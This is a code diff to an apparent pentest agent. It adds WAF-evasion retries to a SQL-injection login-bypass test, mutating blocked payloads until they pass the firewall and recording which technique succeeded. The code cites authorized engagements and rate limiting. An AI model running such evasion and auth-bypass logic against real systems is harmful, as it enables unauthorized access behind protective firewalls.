@@ -39,6 +39,8 @@ import requests
 from datetime import datetime, timezone
 from typing import Any
 
+from pentagon.tools.waf_evasion_tool import generate_sql_variants, is_waf_blocked
+
 
 DEFAULT_TIMEOUT = 15
 DEFAULT_HEADERS = {"User-Agent": "PENTAGON-Exploitation-Agent/1.0"}
@@ -102,6 +104,7 @@ def run_sqli_test(
     token: str | None = None,
     timeout: int = DEFAULT_TIMEOUT,
     delay_between_requests: float = 0.6,
+    use_waf_evasion: bool = False,
 ) -> dict[str, Any]:
     """
     Teste l'injection SQL sur un login, des endpoints paramétrés et/ou des
@@ -116,6 +119,10 @@ def run_sqli_test(
         token: token d'authentification à présenter sur les endpoints protégés.
         timeout: délai d'attente par requête.
         delay_between_requests: délai éthique entre requêtes.
+        use_waf_evasion: si True, lorsqu'une charge brute est BLOQUÉE par un WAF,
+            on réessaie avec des variantes d'évasion (mutation de charge) afin de
+            tester l'application derrière le pare-feu. Sert à lever les faux
+            négatifs. À n'activer que sur cible autorisée (RoE exploitation).
 
     Returns:
         Dict structuré avec les résultats et les findings SQLi.
@@ -129,6 +136,12 @@ def run_sqli_test(
         "endpoints_tested": 0,
         "results": [],
         "sqli_findings": [],
+        "waf_evasion": {
+            "enabled": use_waf_evasion,
+            "blocked_requests": 0,
+            "evasion_attempts": 0,
+            "bypassed_via": [],
+        },
         "duration_seconds": None,
         "error": None,
     }
@@ -142,10 +155,13 @@ def run_sqli_test(
     try:
         # === Vecteur 1 : contournement d'authentification sur le login ===
         if login_url:
-            login_outcome = _test_login_sqli(login_url, timeout, delay_between_requests)
+            login_outcome = _test_login_sqli(
+                login_url, timeout, delay_between_requests, use_waf_evasion
+            )
             result["results"].append(login_outcome)
             result["endpoints_tested"] += 1
             result["sqli_findings"].extend(login_outcome.get("findings", []))
+            _aggregate_evasion(result["waf_evasion"], login_outcome.get("evasion"))
 
         # === Vecteur 2 : injection sur les paramètres de chemin des endpoints ===
         for endpoint in (injectable_endpoints or []):
@@ -177,9 +193,73 @@ def run_sqli_test(
     return result
 
 
-def _test_login_sqli(login_url: str, timeout: int, delay: float) -> dict[str, Any]:
+def _aggregate_evasion(summary: dict[str, Any], partial: dict[str, Any] | None) -> None:
+    """Fusionne les statistiques d'évasion d'un vecteur dans le récapitulatif."""
+    if not partial:
+        return
+    summary["blocked_requests"] += partial.get("blocked_requests", 0)
+    summary["evasion_attempts"] += partial.get("evasion_attempts", 0)
+    for tech in partial.get("bypassed_via", []):
+        if tech not in summary["bypassed_via"]:
+            summary["bypassed_via"].append(tech)
+
+
+def _try_login_evasion(
+    payload: str,
+    attempt_fn: "Any",
+    outcome: dict[str, Any],
+    delay: float,
+) -> "requests.Response | None":
+    """
+    Réessaie une charge de login BLOQUÉE sous formes mutées (évasion WAF).
+
+    Parcourt les variantes d'évasion de la charge ; renvoie la première réponse
+    qui franchit le WAF (idéalement un contournement d'auth réussi). La réponse
+    retournée porte l'attribut `_pentagon_evaded` = nom de la technique efficace,
+    lu par l'appelant pour enrichir le finding.
+
+    Args:
+        payload: charge d'origine (brute) bloquée par le WAF.
+        attempt_fn: fonction (charge: str) -> Response | None qui envoie la charge.
+        outcome: dict du vecteur, pour journaliser les stats d'évasion.
+        delay: délai éthique entre requêtes.
+    """
+    best: "requests.Response | None" = None
+    for variant in generate_sql_variants(payload):
+        outcome["evasion"]["evasion_attempts"] += 1
+        resp = attempt_fn(variant["payload"])
+        if resp is None:
+            time.sleep(delay)
+            continue
+
+        if not is_waf_blocked(resp.status_code, dict(resp.headers), resp.text):
+            technique = variant["technique"]
+            if technique not in outcome["evasion"]["bypassed_via"]:
+                outcome["evasion"]["bypassed_via"].append(technique)
+            try:
+                resp._pentagon_evaded = technique  # type: ignore[attr-defined]
+            except Exception:
+                pass
+            if _looks_like_login_success(resp):
+                return resp  # évasion + contournement d'auth = preuve forte
+            if best is None:
+                best = resp  # a franchi le WAF sans contourner l'auth
+        time.sleep(delay)
+    return best
+
+
+def _test_login_sqli(
+    login_url: str,
+    timeout: int,
+    delay: float,
+    use_waf_evasion: bool = False,
+) -> dict[str, Any]:
     """
     Teste le login pour : (a) contournement d'auth par tautologie, (b) erreur SQL.
+
+    Si `use_waf_evasion` est actif et qu'une charge brute est bloquée par un WAF,
+    on réessaie la même charge sous forme mutée (évasion) pour atteindre
+    l'application derrière le pare-feu.
     """
     outcome: dict[str, Any] = {
         "vector": "auth_bypass",
@@ -187,28 +267,51 @@ def _test_login_sqli(login_url: str, timeout: int, delay: float) -> dict[str, An
         "tested_payloads": 0,
         "findings": [],
         "notes": [],
+        "evasion": {"blocked_requests": 0, "evasion_attempts": 0, "bypassed_via": []},
     }
 
     user_field = COMMON_USERNAME_FIELDS[0]
     pass_field = COMMON_PASSWORD_FIELDS[0]
 
-    # (a) Contournement d'authentification
-    for payload in AUTH_BYPASS_PAYLOADS:
-        outcome["tested_payloads"] += 1
+    def _attempt(candidate: str) -> requests.Response | None:
+        """Envoie une charge de login. Renvoie la réponse ou None (erreur réseau)."""
         try:
-            response = requests.post(
+            return requests.post(
                 login_url,
-                json={user_field: payload, pass_field: "pentagon_invalid_pw"},
+                json={user_field: candidate, pass_field: "pentagon_invalid_pw"},
                 headers=DEFAULT_HEADERS,
                 timeout=timeout,
             )
         except requests.RequestException as e:
             outcome["notes"].append(f"Erreur réseau : {type(e).__name__}")
+            return None
+
+    # (a) Contournement d'authentification
+    for payload in AUTH_BYPASS_PAYLOADS:
+        outcome["tested_payloads"] += 1
+        response = _attempt(payload)
+        if response is None:
             time.sleep(delay)
             continue
 
+        # Charge brute bloquée par le WAF → tentative d'évasion si autorisée.
+        if use_waf_evasion and is_waf_blocked(
+            response.status_code, dict(response.headers), response.text
+        ):
+            outcome["evasion"]["blocked_requests"] += 1
+            time.sleep(delay)
+            response = _try_login_evasion(payload, _attempt, outcome, delay)
+            if response is None:
+                continue
+
         if _looks_like_login_success(response):
-            outcome["findings"].append({
+            evaded = response is not None and getattr(response, "_pentagon_evaded", None)
+            evidence = (
+                "Connexion réussie avec une charge d'injection en guise "
+                "d'identifiant (tautologie SQL) — l'authentification est "
+                "contournable sans mot de passe valide."
+            )
+            finding: dict[str, Any] = {
                 "title": "Contournement d'authentification par injection SQL",
                 "severity": "critical",
                 "owasp": "A03:2021 Injection",
@@ -216,10 +319,18 @@ def _test_login_sqli(login_url: str, timeout: int, delay: float) -> dict[str, An
                 "mitre": "T1190",
                 "vector": "auth_bypass",
                 "target": login_url,
-                "evidence": "Connexion réussie avec une charge d'injection en guise "
-                            "d'identifiant (tautologie SQL) — l'authentification est "
-                            "contournable sans mot de passe valide.",
-            })
+                "evidence": evidence,
+            }
+            if evaded:
+                # Le WAF masquait la faille : information à haute valeur pour le rapport.
+                finding["waf_evasion_required"] = True
+                finding["evasion_technique"] = evaded
+                finding["evidence"] += (
+                    f" La charge brute était bloquée par le WAF ; elle passe après "
+                    f"évasion ({evaded}), ce qui prouve que le pare-feu masquait une "
+                    f"vulnérabilité applicative réelle."
+                )
+            outcome["findings"].append(finding)
             break  # preuve obtenue, inutile d'insister
         time.sleep(delay)
 
